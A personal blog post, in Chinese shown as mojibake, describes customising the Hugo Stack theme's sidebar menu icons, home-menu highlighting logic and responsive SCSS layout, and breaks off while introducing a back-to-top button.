å¤©æŠŠä½œè€…æ›´æ–°å‡ºæ¥çš„ä¸€äº›å¥½ä¸œè¥¿å’Œæˆ‘ä¹‹å‰è‡ªå·±ä¿®æ”¹çš„ä¸€äº›ä¸œè¥¿ç»“åˆä¸€ä¸‹ï¼Œä¸¤è€…éƒ½æœ‰æ‰€æ‰¬å¼ƒï¼Œæ€»çš„æ¥è¯´å°±æ˜¯å¸Œæœ›æŠŠæˆ‘è¿™ä¸ªè‡ªå¨±è‡ªä¹çš„åšå®¢å¼„å¾—å†å¥½çœ‹ä¸€äº›ã€‚\nåŠ¨å·¥å‰çºªå¿µ åŠ¨å·¥ä¹‹å‰ï¼ŒæŠŠæ—§æœ‰çš„åšå®¢æ ·å¼å’Œ æœªä½œä¿®æ”¹ä¹‹å‰çš„ æ–°ç‰ˆStackæ ·å¼è¿›è¡Œä¸€ä¸‹åˆå½±ç•™å¿µï¼Œä¹Ÿç®—æ˜¯è¿™ä¸ªåšå®¢æ ·è²Œæˆé•¿çš„ä¸€ä¸ªé‡Œç¨‹ç¢‘å§ã€‚å…¶å®æˆ‘æƒ³æœ€ç»ˆçš„æ ·å­è·Ÿç°æœ‰çš„æ ·å­ç›¸æ¯”ï¼Œä¸ä¼šæœ‰å¾ˆå¤§çš„å˜åŒ–ï¼Œä½†åº”è¯¥èƒ½å¤ŸæŠŠæˆ‘æ­¤å‰å¾ˆä¸çˆ½ä¸”æ— èƒ½ä¸ºåŠ›çš„ä¸€äº›ç»†èŠ‚æ¶ˆç­æ‰ï¼Œåæ–‡ç»†è¯´~\næ—§ä¸»é¡µ æ–°Stackä¸»é¡µï¼ˆæœªä¿®æ”¹) æ—§æ–‡ç« é¡µé¢ æ–°Stackæ–‡ç« é¡µé¢ï¼ˆæœªä¿®æ”¹) Part 1 å·¦è¾¹æ  å›¾æ ‡ å›¾æ ‡æ˜¾ç¤º ä¿®æ”¹é…ç½®æ–‡ä»¶å’Œ page\né¦–å…ˆï¼Œå¯ä»¥çœ‹åˆ°æ–°ç‰ˆçš„ä¸»é¢˜å·¦è¾¹æ çš„å‡ ä¸ªè·³è½¬æŒ‰é’®ï¼ˆåæ–‡ä½¿ç”¨ menu æ¥æŒ‡ä»£è¿™å‡ ä¸ªä¸œè¥¿ï¼‰æ˜¯æ²¡æœ‰å›¾æ ‡çš„ï¼Œå…‰ç§ƒç§ƒçš„å¾ˆä¸å¥½çœ‹ã€‚\nå·¦è¾¹æ  å‘ç”Ÿè¿™ç§æƒ…å†µçš„åŸå› æ˜¯æ–°ç‰ˆçš„ menu å›¾æ ‡ä¸æ—§ç‰ˆçš„å›¾æ ‡ä¸åŒã€‚åœ¨æ—§ç‰ˆä¸»é¢˜ä¸­ï¼Œ menu å›¾æ ‡ç”± menu.main.pre æ¥æŒ‡å®šï¼Œè€Œæ–°ç‰ˆçš„å›¾æ ‡ç”± menu.main.params.icon æ¥æŒ‡å®šï¼Œå‚æ•°éƒ½ä¸ä¸€æ ·äº†ï¼Œå›¾æ ‡ä¸¢å¤±æ˜¯å½“ç„¶çš„äº†ï¼\næ ¹æ®ä½œè€…çš„ æ–‡æ¡£ ï¼Œæ·»åŠ é¡µé¢æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯åœ¨ content/page é¡µé¢çš„ Front Matter ä¸­åŠ ä¸Š menu.main å‚æ•°ï¼Œå¦ä¸€ç§æ˜¯åœ¨ config.yaml æ–‡ä»¶ä¸­æ·»åŠ  menu.main å‚æ•°ã€‚æ—§æœ‰çš„ä¸»é¢˜ä¹Ÿæ˜¯è¿™ä¹ˆå·¥ä½œçš„ï¼Œ æˆ‘ä»¬åªéœ€è¦æŠŠè·Ÿå›¾æ ‡ç›¸å…³çš„å‚æ•°ä¿®æ”¹ä¸€ä¸‹å°±è¡Œäº† ã€‚\nä»¥ config.yaml ä¸­çš„å†…å®¹ä¸ºä¾‹ï¼Œä»¥å‰çš„ menu æ˜¯è¿™æ ·çš„ï¼š\nmenu: main: - identifier: home name: åšæ–‡ url: / weight: -100 pre: home ä¿®æ”¹è¿‡åï¼Œè¦å˜æˆè¿™æ ·ï¼š\nmenu: main: - identifier: home name: ä¸»é¡µ url: / weight: -100 params: icon: home åœ¨ page å½“ä¸­çš„é‚£äº›é¡µé¢ä¹Ÿè¦å¦‚æ­¤ä¿®æ”¹ã€‚\näºæ˜¯æˆ‘ä»¬çš„å›¾æ ‡å°±å›æ¥äº†ï¼\nè°ƒå‡ºå›¾æ ‡ å›¾æ ‡é«˜äº® å¦‚æœå½“å‰é¡µé¢å¯¹åº”å·¦è¾¹æ çš„æŸä¸ªå…¥å£ï¼Œé‚£ä¹ˆå·¦è¾¹æ çš„å›¾æ ‡åº”è¯¥é«˜äº®æ˜¾ç¤ºã€‚\nä¸»é¡µå›¾æ ‡é«˜äº® ä¸»é¡µå›¾æ ‡ä¸é«˜äº®ï¼ˆæ–°ç‰ˆ) æ–°ç‰ˆçš„ä¸»é¢˜åªæœ‰ä¸€ç‚¹å°é—®é¢˜ï¼Œé‚£å°±æ˜¯ä¸»é¡µçš„å›¾æ ‡æ²¡åŠæ³•é«˜äº®ã€‚\nåœ¨ layouts/partials/sidebar/left.html ä¸­æ‰¾åˆ°äº†å›¾æ ‡é«˜äº®çš„ç›¸å…³ä»£ç ï¼Œä»ç¬¬ 56 è¡Œå¼€å§‹ï¼š\n\u0026lt;ol class=\u0026#34;menu\u0026#34; id=\u0026#34;main-menu\u0026#34;\u0026gt; {{ $currentPage := . }} {{ range .Site.Menus.main }} {{ $active := or (eq $currentPage.Title .Name) (or ($currentPage.HasMenuCurrent \u0026#34;main\u0026#34; .) ($currentPage.IsMenuCurrent \u0026#34;main\u0026#34; .)) }} \u0026lt;li {{ if $active }} class=\u0026#39;current\u0026#39; {{ end }}\u0026gt; \u0026lt;a href=\u0026#39;{{ .URL | relLangURL }}\u0026#39; {{ if eq .Params.newTab true }}target=\u0026#34;_blank\u0026#34;{{ end }}\u0026gt; {{ $icon := default .Pre .Params.Icon }} {{ if .Pre }} {{ warnf \u0026#34;Menu item [%s] is using [pre] field to set icon, please use [params.icon] instead.\\nMore information: https://docs.stack.jimmycai.com/configuration/custom-menu.html\u0026#34; .URL }} {{ end }} {{ with $icon }} {{ partial \u0026#34;helper/icon\u0026#34; . }} {{ end }} \u0026lt;span\u0026gt;{{- .Name -}}\u0026lt;/span\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; æ³¨æ„ä»£ç ç‰‡æ®µä¸­çš„ç¬¬å››è¡Œï¼Œå³æ§åˆ¶ active è¿™ä¸ªå±æ€§çš„éƒ¨åˆ†ï¼Œå½“ active ä¸º true æ—¶ï¼Œå·¦è¾¹æ çš„å¯¹åº”å›¾æ ‡å°±é«˜äº®äº†ã€‚\nä»€ä¹ˆæƒ…å†µä¸‹ active ä¼šæ˜¯ true å‘¢ï¼Ÿä½œè€…åœ¨è¿™è¾¹å†™çš„è¯­å¥æ¯”è¾ƒå¤æ‚ï¼Œå…¶å®åªæœ‰ä¸¤ç§æƒ…å†µï¼š\nå½“å‰é¡µé¢çš„ æ ‡é¢˜ å’ŒæŸä¸ª menu.name ç›¸åŒï¼› å½“å‰é¡µé¢å¯ä»¥åœ¨ Menus èœå•ä¸­æ‰¾åˆ°ï¼Œå³å½“å‰é¡µé¢å±äºä» menu èœå•å¯ä»¥è®¿é—®çš„é¡µé¢ã€‚ åœ¨æœ¬åœ°æµ‹è¯•ä¸­ï¼Œæ— è®ºä» config æ–‡ä»¶æ·»åŠ ä¸»é¡µå…¥å£ï¼Œè¿˜æ˜¯ä» page ç›®å½•ä¸‹æ·»åŠ ä¸»é¡µå…¥å£ï¼Œä¸»é¡µéƒ½æ˜¯ ä¸é«˜äº® çš„ã€‚çœ‹æ¥åœ¨Hugoä¸­ä¸»é¡µä¸å±äº menu èœå•çš„ä¸€éƒ¨åˆ†ã€‚\nactive çš„åŸç†åŸºæœ¬ä¸Šå¼„æ¸…ï¼Œç†è®ºä¸Šå¯ä»¥å°†ä¸»é¡µå…¥å£ä¹Ÿè®¾ç½®æˆé«˜äº®ï¼›ä½†æ˜¯æ—¶é—´æœ‰é™ä¸”éš¾ä»¥æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„é€»è¾‘ï¼Œå› æ­¤æš‚æ—¶ä¸è€ƒè™‘è¿™ä¸ªç»†èŠ‚ã€‚\n2022-01-15æ›´æ–°\næˆ‘ä»¬é‡æ–°æ¢³ç†ä¸€ä¸‹ä¸Šé¢çš„ä»£ç é€»è¾‘ï¼šå¯¹äºä»»æ„ä¸€ä¸ªé¡µé¢ï¼Œé¦–å…ˆè·å–é¡µé¢å¯¹è±¡æœ¬èº«ï¼Œç„¶åå¯¹å…¨ç«™çš„æ‰€æœ‰ Menus è¿›è¡Œéå†ï¼Œè®°å½“å‰éå†åˆ°çš„èœå•å¯¹è±¡ä¸º menu ï¼Œå¦‚æœå½“å‰èœå•ç¬¦åˆæŸç§æ¡ä»¶ï¼Œå°±å°†å…¶é«˜äº®ã€‚\nå½“ï¼š\nå½“å‰é¡µé¢çš„ æ ‡é¢˜ å’Œ menu.name ç›¸åŒçš„æ—¶å€™ï¼› å½“å‰é¡µé¢å±äº menu èœå•ä¸‹çš„é¡µé¢ï¼› ä¸¤ä¸ªæ¡ä»¶ä»»æ„ä¸€ä¸ªæˆç«‹ï¼Œæˆ‘ä»¬éå†åˆ°çš„ menu ç»„ä»¶å°±äº§ç”Ÿé«˜äº®ã€‚\næ­£å¸¸æƒ…å†µä¸‹ï¼Œé«˜äº®æ˜¯ç”±ç¬¬ä¸€ä¸ªæ¡ä»¶äº§ç”Ÿçš„ï¼Œå³æŸä¸ªé¡µé¢çš„æ ‡é¢˜ä¸ menu.name ç›¸åŒã€‚ä¾‹å¦‚ï¼Œç‚¹å‡»ã€å½’æ¡£ã€‘è¿™ä¸ªæŒ‰é’®ï¼Œè·³è½¬åˆ° å½’æ¡£ è¿™ä¸ªé¡µé¢ï¼Œåœ¨è¿™ä¸ªé¡µé¢åŠ è½½çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªæ¡ä»¶è§¦å‘ï¼Œå¯¹åº”çš„åç§°ä¸ºâ€œå½’æ¡£â€çš„é‚£ä¸€ä¸ª menu å°±æ˜¾ç¤ºä¸ºé«˜äº®ã€‚\nè€Œåœ¨ä¸»é¡µä¸‹ï¼Œä¸»é¡µçš„æ ‡é¢˜æ˜¯ç½‘ç«™çš„æ ‡é¢˜ï¼Œä¸»é¡µçš„ menu.name å´æ˜¯â€œä¸»é¡µâ€ï¼Œå› è€Œç¬¬ä¸€ä¸ªæ¡ä»¶æ— æ³•æˆç«‹ï¼›åœ¨æ›´æ—©çš„åˆ†æä¸­ï¼Œæˆ‘è®¤ä¸ºç”±äºHugo APIçš„åŸå› ï¼Œä½¿å¾— / ç›®å½•ä¸è¢«è®¤ä¸ºæ˜¯æŸä¸ª menu èƒ½å¤Ÿè¾¾åˆ°çš„é¡µé¢ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œç¬¬äºŒä¸ªæ¡ä»¶ä¹Ÿæ²¡æœ‰æˆç«‹ï¼Œä¸»é¡µçš„å›¾æ ‡å°±ä¸æ˜¾ç¤ºé«˜äº®äº†ã€‚\nå¸Œæœ›è®©ä¸»é¡µå›¾æ ‡é«˜äº®ï¼Œå…‰é ä½œè€…çš„è¿™ä¸¤ä¸ªé€»è¾‘æ˜¯ä¸å¤Ÿçš„ï¼Œåº”è¯¥ä¸º $active å˜é‡è¡¥å……ä¸€äº›é€»è¾‘ã€‚\nåœ¨ä¸»é¡µï¼Œé¡µé¢æ ‡é¢˜æ˜¯ç«™ç‚¹æ ‡é¢˜å³ XR_S's Blog ï¼Œè€Œ menu.name æ˜¯ ä¸»é¡µ ï¼Œå› è€Œç¬¬ä¸€ä¸ªæ¡ä»¶ä¸æˆç«‹ï¼›åœ¨æ›´æ—©çš„åˆ†æä¸­ï¼Œ æˆ‘è®¤ä¸ºç”±äºhugo APIçš„é—®é¢˜ä½¿å¾—ç¬¬äºŒä¸ªæ¡ä»¶å¯¹äº / è·¯å¾„ä¹Ÿä¸æˆç«‹ï¼Œå› æ­¤ä¸»é¡µçš„å…¥å£æ²¡æœ‰æ˜¾ç¤ºé«˜äº®ã€‚\né‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æ·»åŠ ä»€ä¹ˆé€»è¾‘å‘¢ï¼Ÿ\né¦–å…ˆæˆ‘ä»¬çŸ¥é“ä¸»é¡µçš„ menu æ˜¯æ·»åŠ åœ¨ config æ–‡ä»¶ä¸­çš„ï¼Œå®ƒçš„é…ç½®æ˜¯ï¼š\nmenu: main: - identifier: home name: ä¸»é¡µ url: / weight: -100 params: icon: home è¿™é‡Œæœ‰å®ƒçš„ç‹¬ä¸€æ— äºŒçš„å±æ€§å°±æ˜¯ identifier ï¼Œåˆ©ç”¨è¿™ä¸ªå±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°ä»£è¡¨ä¸»é¡µçš„è¿™ä¸€ä¸ª menu å…¥å£ã€‚\næˆ‘é€‰ç”¨çš„é€»è¾‘æ˜¯ï¼š å‡å¦‚å½“å‰çš„é¡µé¢æ ‡é¢˜ä¸ç½‘ç«™æ ‡é¢˜ç›¸åŒï¼Œæˆ‘å°±å°†ä¸»é¡µçš„ menu å…¥å£è®¾ç½®ä¸ºé«˜äº® ã€‚\nå› æ­¤ä¿®æ”¹ $active éƒ¨åˆ†çš„ç›¸å…³ä»£ç ä¸ºï¼š\n{{ $currentPage := . }} {{ $siteTitle := .Site.Title }} {{ range .Site.Menus.main }} {{ $active := or (eq $currentPage.Title .Name) (or ($currentPage.HasMenuCurrent \u0026#34;main\u0026#34; .) ($currentPage.IsMenuCurrent \u0026#34;main\u0026#34; .)) }} {{ $active := or ($active) (and (eq $currentPage.Title $siteTitle ) (eq .Identifier \u0026#34;home\u0026#34;)) }} æˆåŠŸè®©ä¸»é¡µèœå•é«˜äº®äº†ï¼\nä¸»é¡µå¸ƒå±€ ä¸»é¡µçš„å¸ƒå±€å¯ä»¥è¯´æ˜¯æ•´ä¸ªæ–°ä¸»é¢˜å½“ä¸­æœ€ä»¤äººä¸æ»¡æ„çš„åœ°æ–¹ã€‚\næˆ‘æ²¡æœ‰ç¾å­¦åŸºç¡€ï¼Œåªä»æœ€åŸºæœ¬çš„ä¸ªäººçš„è§†è§‰å–œå¥½å‡ºå‘ï¼Œé¦–å…ˆå¯¹æ¯”ä¸€ä¸‹æ–°æ—§ä¸¤ä¸ªä¸»é¢˜ä¸»é¡µå¸ƒå±€çš„å·®å¼‚ã€‚\næ—§ä¸»é¢˜ æ–°ä¸»é¢˜ æˆ‘çš„æ„Ÿå—æ˜¯ï¼šæ—§ä¸»é¢˜çš„é¡µé¢å·¦å³ç«¯æœ‰ä¸€å®šçš„ç•™ç™½ï¼Œæ˜¾å¾—æ¯”è¾ƒå’Œè°ï¼›æ–°ä¸»é¢˜çš„é¡µé¢å·¦å³ç«¯è·ç¦»æµè§ˆå™¨è¾¹æ¡†éå¸¸è¿‘ï¼Œè¿‡äºæ‹¥æŒ¤äº†ã€‚\nå†³å®šå°†æ—§ä¸»é¢˜çš„ä¸»é¡µå¸ƒå±€è¿ç§»åˆ°æ–°ä¸»é¢˜ä¸Šï¼ŒåŒæ—¶è¿›è¡Œä¸€äº›å¾®è°ƒã€‚\nä¿®æ”¹è‡ªé€‚åº”å¸ƒå±€ è¦ä¿®æ”¹ä¸»é¡µçš„å¸ƒå±€ï¼Œé¦–å…ˆåº”è¯¥æ‰¾åˆ°æ§åˆ¶ä¸»é¡µæ ·å¼çš„é‚£ä¸ªæ–‡ä»¶ã€‚å®ƒçš„è·¯å¾„æ˜¯åœ¨ [themePath]/assets/scss/grid.scss ï¼Œä¸è¿‡æˆ‘å¸Œæœ›è¯»è€…èƒ½æ˜ç™½æˆ‘æ˜¯æ€ä¹ˆæ‰¾åˆ°å®ƒçš„ã€‚\næ­£å¦‚æˆ‘åœ¨ è¿™ç¯‡è®°å½• å½“ä¸­æ‰€è¯´ï¼Œç²¾ç¡®è°ƒæ•´æ ·å¼ï¼Œä½ åº”è¯¥ä½¿ç”¨å¼€å‘è€…å·¥å…·é€‰ä¸­ä½ çš„ç›®æ ‡ï¼Œç„¶åçœ‹åˆ°å®ƒçš„ class ï¼Œä¹‹ååœ¨é¡¹ç›®çš„æ‰€æœ‰CSSæ–‡ä»¶ä¸­æ‰¾åˆ°è¿™ä¸ª class å¯¹åº”çš„é€‰æ‹©å™¨ï¼Œå°±èƒ½çœ‹åˆ°ä½œè€…ä¸ºå®ƒèµ‹äºˆäº†å“ªäº›æ ·å¼ã€‚\nä¾‹å¦‚æˆ‘ä»¬è¦ä¿®æ”¹ä¸»é¡µçš„å¸ƒå±€ï¼Œé‚£å°±è¦ç”¨å¼€å‘è€…å·¥å…·é€‰ä¸­ä¸»é¡µï¼Œå¯ä»¥æ ¹æ®ç›´è§‰æ¥åˆ¤æ–­ä½ é€‰çš„å¯¹ä¸å¯¹ï¼Œä¸€èˆ¬æ¥è¯´ä¸€ä¸ªé¡µé¢ä¼šåˆ†æˆå¥½å‡ ä¸ªæ¨¡å—ï¼Œå°±åƒæˆ‘ä»¬çš„ä¸»é¡µé‚£æ ·ï¼š\né€‰ä¸­ä¸»é¡µ æˆ‘ä»¬çŸ¥é“è¿™ä¸‰ä¸ªæ¨¡å—æ„æˆäº†ä¸»é¡µï¼Œå®ƒçš„ class æ˜¯ container ï¼›ç›´æ¥åˆ°CSSæ–‡ä»¶ç›®å½•ä¸­æŸ¥æ‰¾ï¼Œå‘ç° container è¿™ä¸ªç±»çš„æ ·å¼æ˜¯åœ¨ grid.scss è¿™ä¸ªæ–‡ä»¶ä¸­å®šä¹‰ã€‚\nå¼€å§‹é˜…è¯»è¿™ä¸ªæ–‡ä»¶ï¼Œåœ¨å¾ˆé å‰çš„åœ°æ–¹å°±å‘ç°äº†å®ƒçš„é‡è¦å†…å®¹å“ˆï¼\n.container { margin-left: auto; margin-right: auto; .left-sidebar { max-width: var(--left-sidebar-max-width); margin-right: 1%; } .right-sidebar { max-width: var(--right-sidebar-max-width); /// Display right sidebar when min-width: lg @include respond(lg) { display: block; } } \u0026amp;.extended { @include respond(md) { max-width: 1024px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 30%; } @include respond(lg) { max-width: 1280px; --left-sidebar-max-width: 20%; --right-sidebar-max-width: 30%; } @include respond(xl) { max-width: 1536px; --left-sidebar-max-width: 15%; --right-sidebar-max-width: 25%; } } === snip === } æˆ‘ä»¬çœ‹åˆ°ï¼Œä½œè€…åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­é™åˆ¶äº† container çš„å­å…ƒç´  left-sidebar å’Œ right-sidebar çš„æœ€å¤§å®½åº¦ï¼Œåˆ†åˆ«ç”¨ --left-sidebar-max-width å’Œ --right-sidebar-max-width æ¥è¡¨ç¤ºæœ€å¤§å®½åº¦çš„é™åˆ¶ï¼Œç„¶ååŠ¨æ€è°ƒæ•´è¿™ä¸¤ä¸ªå˜é‡çš„å€¼ï¼Œæ¥å®ç°å¯¹ä¸åŒè®¾å¤‡å±å¹•çš„é€‚åº”ã€‚\nåœ¨Stackæ–°ä¸»é¢˜çš„å„ä¸ªCSSæ–‡ä»¶ä¸­ï¼Œç»å¸¸è¦çœ‹åˆ° @include respond() è¿™ç§å†™æ³•ï¼Œå®ƒæ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿ\næˆ‘ä»¬æ‰¾åˆ°äº† asset/scss/breakpoints.scss è¿™ä¸ªæ–‡ä»¶ï¼Œå®ƒçš„å†…å®¹æ˜¯è¿™æ ·çš„ï¼š\n$breakpoints: ( sm: 640px, md: 768px, lg: 1024px, xl: 1280px, 2xl: 1536px, ); @mixin respond($breakpoint) { @if not map-has-key($breakpoints, $breakpoint) { @warn \u0026#34;\u0026#39;#{$breakpoint}\u0026#39; is not a valid breakpoint\u0026#34;; } @else { @media (min-width: map-get($breakpoints, $breakpoint)) { @content; } } } å•Šå“ˆï¼ŒåŸæ¥ respond å‡½æ•°å°±æ˜¯ä¸ªCSSä¸­çš„ @media å…³é”®å­—çš„å°è£…å˜›ã€‚\nä¾‹å¦‚åœ¨ä¸Šé¢çš„æ ·å¼ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ° @include respond(md) è¿™æ ·çš„ç”¨æ³•ï¼Œç¿»è¯‘ç¿»è¯‘å°±æ˜¯ @media(min-width: 768px) è€Œå·²ï¼è¡¨ç¤ºè¿™ä¸ªæ ·å¼è¦åœ¨å±å¹•å®½åº¦ 768px ä»¥ä¸Šæ‰èƒ½ç”Ÿæ•ˆï¼\nçœ‹åˆ°è¿™é‡Œï¼Œè¿™äº›è‡ªé€‚åº”çš„å¸ƒå±€å°±æ²¡é‚£ä¹ˆå“äººäº†ï¼Œå°±æ˜¯ åœ¨ä¸åŒçš„è®¾å¤‡ä¸ŠæŒ‡å®šä¸åŒçš„å·¦å³ä¾§è¾¹æ å®½åº¦ è€Œå·²ã€‚\næˆ‘ä½¿ç”¨çš„ç¬”è®°æœ¬ç”µè„‘å±å¹•å®½åº¦æ˜¯åœ¨ 1024px ä»¥ä¸Šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘åªè¦ä¿®æ”¹ @include respond(lg) åº•ä¸‹çš„æ ·å¼å°±è¡Œäº†ã€‚\nåœ¨ asset/scss/custom.scss æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹çš„ä»£ç ï¼š\n.container { margin-left: auto; margin-right: auto; \u0026amp;.extended { /* range: 768-1024 */ @include respond(md) { max-width: 1024px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 30%; } /* range: 1024-1280 */ @include respond(lg) { max-width: 1280px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 22%; } } \u0026amp;.compact { @include respond(md) { --left-sidebar-max-width: 25%; max-width: 768px; } @include respond(lg) { max-width: 1024px; --left-sidebar-max-width: 20%; } @include respond(xl) { max-width: 1280px; } } } å…¶ä¸­åœ¨æˆ‘çš„ç”µè„‘ä¸ŠçœŸæ­£èµ·åˆ°ä½œç”¨çš„åªæœ‰ @include respond(lg) éƒ¨åˆ†è€Œå·²ï¼æˆ‘æŠŠå·¦ä¾§è¾¹æ çš„å®½åº¦æ”¾å®½åˆ° 25% ï¼Œå³ä¾§è¾¹æ å®½åº¦æ”¾åˆ° 22% ï¼Œæ˜¯æˆ‘ä¸ªäººæ¯”è¾ƒèˆ’æœçš„æ•°å­—ã€‚\nä¿®æ”¹éè‡ªé€‚åº”å¸ƒå±€ ç»è¿‡ä¸Šé¢çš„ä¿®æ”¹ï¼Œç°åœ¨çš„ä¸»é¡µåº”è¯¥æ˜¯è¿™æ ·çš„ï¼š\nä¸»é¡µï¼ˆæœªå®Œæˆï¼‰ ä¸»è¦æœ‰å‡ ä¸ªé—®é¢˜ï¼š\nä¸­é—´æ æ˜¾å¾—è¿‡äºå®½ï¼›\nå·¦è¾¹æ å¤´åƒå¤ªæŠ¢æˆã€‚\næˆ‘ä»¬é’ˆå¯¹ left-sidebar å’Œ right-sidebar å†è¿›è¡Œä¸€ä¸‹å¾®è°ƒï¼Œåœ¨ custom.scss ä¸­ç»§ç»­è¿½åŠ ï¼š\n.left-sidebar { --sidebar-avatar-size: 120px; --sidebar-element-separation: 20px; margin-right: 1%; padding: var(--main-top-padding) 15px; max-height: 100vh; padding-right: 25px; } .right-sidebar { margin-left: 25px; } è¿™éƒ¨åˆ†å†…å®¹æ˜¯ç»è¿‡æ—§å‚æ•°çš„è¯•éªŒï¼Œå‘ç°çš„è§†è§‰ä¸Šæ¯”è¾ƒèˆ’æœçš„å‚æ•°ï¼Œè€Œè¿™äº›ä¸œè¥¿ä¸ç”¨éšç€å±å¹•å˜åŒ–è€Œå˜åŒ–ï¼Œå› æ­¤ä¸å†™åœ¨åˆšæ‰çš„è‡ªé€‚åº”å¸ƒå±€ä¸­ï¼Œç›´æ¥æ”¾åœ¨æœ€å¤–å±‚ã€‚\nè‡³æ­¤ï¼Œæˆ‘çš„ä¸»é¡µå°±è°ƒæ•´å®Œæ¯•äº†ã€‚ custom.scss æ–‡ä»¶å…¨éƒ¨å†…å®¹å¦‚ä¸‹ï¼š\n.container { margin-left: auto; margin-right: auto; \u0026amp;.extended { /* min-width: 812 @media (min-width: $on-phone) { max-width: 800px; --left-sidebar-max-width: 25%; } */ /* range: 768-1024 */ @include respond(md) { max-width: 1024px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 30%; } /* range: 1024-1280 */ @include respond(lg) { max-width: 1280px; --left-sidebar-max-width: 25%; --right-sidebar-max-width: 22%; } } \u0026amp;.compact { @include respond(md) { --left-sidebar-max-width: 25%; max-width: 768px; } @include respond(lg) { max-width: 1024px; --left-sidebar-max-width: 20%; } @include respond(xl) { max-width: 1280px; } } } /* è·Ÿä¸Šé¢ container ä¸­çš„ left-sidebar æ²¡æœ‰åŒºåˆ« ä½†æ˜¯è¿™éƒ¨åˆ†å†…å®¹ä¸éœ€è¦ä½¿ç”¨ respond å‡½æ•°ï¼Œå› æ­¤ç›´æ¥æ”¾åœ¨æœ€å¤–å±‚å›ºå®šä¸‹æ¥å³å¯ */ .left-sidebar { --sidebar-avatar-size: 120px; --sidebar-element-separation: 20px; margin-right: 1%; padding: var(--main-top-padding) 15px; max-height: 100vh; padding-right: 25px; } .right-sidebar { margin-left: 25px; } åœ¨ä¿®æ”¹ä¸­ï¼Œæˆ‘æ²¡æœ‰å®Œå…¨å¤åˆ»æ—§ä¸»é¢˜ï¼Œå› ä¸ºæˆ‘åœ¨ä¿®æ”¹è¿‡ç¨‹ä¸­å‘ç°äº†ç°æœ‰å¸ƒå±€çš„ä¸€äº›ä¼˜ç‚¹ï¼Œæ”¾åˆ°ä¸‹ä¸€å°èŠ‚åˆ†æã€‚\nä¸»é¡µè§†è§‰åˆ†æ æ—§ä¸»é¡µ æ–°ä¸»é¡µ æˆ‘æƒ³æŒ‡å‡ºæ—§ä¸»é¡µçš„ä¸€ä¸ªé—®é¢˜ï¼Œè¿™äº›é—®é¢˜åœ¨ç°åœ¨è¿™ä¸ªä¸»é¡µä¸­æ˜¯ä¸å­˜åœ¨äº†ã€‚\næ—§ä¸»é¡µ å¯ä»¥çœ‹åˆ°ï¼Œæ—§ä¸»é¡µä¸­å·¦è¾¹æ å’Œæ–‡ç« åˆ—è¡¨çš„é—´è·æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œè€Œæ–‡ç« åˆ—è¡¨å’Œå³è¾¹æ åˆ™è´´å¾—å¾ˆç´§ï¼Œä¸‰ä¸ªæ¨¡å—äº§ç”Ÿäº†ä¸€ç‚¹å‰²è£‚çš„æ„Ÿè§‰ã€‚\næ–°ä¸»é¡µ è€Œåœ¨æ–°ä¸»é¡µä¸­ï¼Œå››å—ç•™ç™½åŒºåŸŸå®½åº¦åŸºæœ¬ç›¸åŒï¼Œå·¦ä¾§è¾¹æ å ç”¨çš„ç©ºé—´å‡ºè®©ç»™äº†æ–‡ç« åˆ—è¡¨ï¼Œçªå‡ºäº†é‡ç‚¹ï¼Œæ•´ä½“ä¸Šç»™æˆ‘çš„æ„Ÿè§‰æ˜¯æ¯”è¾ƒå’Œè°çš„ã€‚\nPart 2 æ–‡ç« é¡µé¢ æ–°ä¸»é¢˜æ–‡ç« é¡µé¢ è¿™ä¸ªæ–‡ç« é¡µé¢æ˜¯æˆ‘å†³å®šæ›´æ–°æ–°ä¸»é¢˜çš„ä¸€ä¸ªé‡è¦åŸå› ã€‚æ—§ä¸»é¢˜æ˜¯æ²¡æœ‰å³è¾¹çš„ ç›®å½• ä¸€æ çš„ï¼Œæˆ‘æ›¾ç»ä»¿ç…§æ–°ä¸»é¢˜çš„æ ·å¼è‡ªè¡Œå®ç°äº†ä¸€ä¸‹ï¼Œä½†æ˜¯æ•ˆæœå¹¶ä¸æ˜¯ç‰¹åˆ«ç†æƒ³ï¼š\næ—§ä¸»é¢˜æ–‡ç« é¡µé¢ ç›´æ¥æ›´æ–°ä¸»é¢˜ä¹‹åï¼Œè§£å†³äº†æ–‡ç« æ ·å¼çš„ç—›ç‚¹ï¼Œè¿˜æ˜¯æ¯”è¾ƒèˆ’æœçš„ã€‚è€ƒè™‘åˆ°è¿™æ˜¯ä¸€æ¬¡å¤§å‡çº§ï¼Œæˆ‘æƒ³é¡ºä¾¿æŠŠä¹‹å‰çš„ä¸€äº›ä¸è¶³çš„ç»†èŠ‚è¡¥å……ä¸Šã€‚\nè¿”å›é¡¶éƒ¨æŒ‰é’® æ·»åŠ å‡½æ•° åœ¨é˜…è¯»æ¯”è¾ƒé•¿çš„æ–‡ç« æ—¶ï¼Œæœ‰ä¸€ä¸ªä¸œè¥¿æ˜¯æˆ‘è®¤ä¸ºéå¸¸å¿…è¦çš„ï¼Œé‚£å°±æ˜¯è¿”å›é¡¶éƒ¨æŒ‰é’®ã€‚\nåœ¨æ–°ä¸»é¢˜ä¸­ï¼Œä½œè€…å·²ç»å†™å¥½äº†Table Of Conentsï¼ˆå³æ–‡ç« ç›®å½•ï¼‰ï¼Œä¸”å®ƒçš„ä½ç½®å°±åœ¨é¡µé¢å³ä¾§ã€‚æˆ‘å¸Œæœ›ç›´æ¥åœ¨è¯¥ç»„ä»¶çš„ä¸‹æ–¹æ·»åŠ 